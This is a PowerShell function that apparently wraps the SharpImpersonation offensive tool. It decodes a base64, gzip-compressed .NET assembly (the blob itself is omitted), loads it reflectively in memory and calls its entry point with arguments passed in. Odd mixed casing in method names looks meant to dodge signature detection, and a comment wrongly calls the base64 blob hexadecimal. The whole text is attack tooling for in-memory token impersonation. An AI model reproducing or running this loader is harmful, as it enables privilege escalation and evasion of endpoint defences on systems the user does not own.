function Invoke-SharpImpersonation
{
    [CmdletBinding()]
    Param (
        [String]
        $Command = "-h"
    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("H4s...AEA")) # The omitted "H4s...AEA" is actually a 68125 character long hexadecimal string.
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    [SharpImpersonation.Program]::Main($Command.Split("#"))
}
